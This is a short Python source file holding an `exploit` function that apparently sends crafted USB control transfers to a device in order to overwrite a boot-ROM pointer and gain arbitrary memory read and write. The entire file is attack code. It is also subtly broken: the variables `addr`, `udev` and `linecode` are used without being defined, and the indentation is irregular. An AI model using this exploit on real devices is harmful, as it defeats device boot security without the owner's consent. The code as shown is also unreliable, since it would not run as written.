
from src.common import to_bytes, from_bytes
from src.logger import log

import usb
import array


def exploit(device, config, payload, arguments):

    def da_read(address, length, check_result = True):
        return da_read_write(0, address, length, None, check_result)

    def da_write(address, length, data, check_result = True):
        return da_read_write(1, address, length, data, check_result)

    def da_read_write(direction, address, length, data = None, check_result = True):
            try:
                device.cmd_da(0,0,1)
                device.read32(addr)
            except:
                pass

            for i in range(3):
                udev.ctrl_transfer(0x21, 0x20, 0, 0, linecode + array.array('B', to_bytes(config.ptr_da + 8 - 3 + i, 4, '<')))
                udev.ctrl_transfer(0x80, 0x6, 0x0200, 0, 9)

            if address < 0x40:
                for i in range(4):
                    udev.ctrl_transfer(0x21, 0x20, 0, 0, linecode + array.array('B', to_bytes(config.ptr_da - 6 + (4 - i), 4, '<')))
                    udev.ctrl_transfer(0x80, 0x6, 0x0200, 0, 9)
                return device.cmd_da(direction, address, length, data, check_result)
            else:
                for i in range(3):
                    udev.ctrl_transfer(0x21, 0x20, 0, 0, linecode + array.array('B', to_bytes(config.ptr_da - 5 + (3 - i), 4, '<')))
                    udev.ctrl_transfer(0x80, 0x6, 0x0200, 0, 9)
                return device.cmd_da(direction, address - 0x40, length, data, check_result)
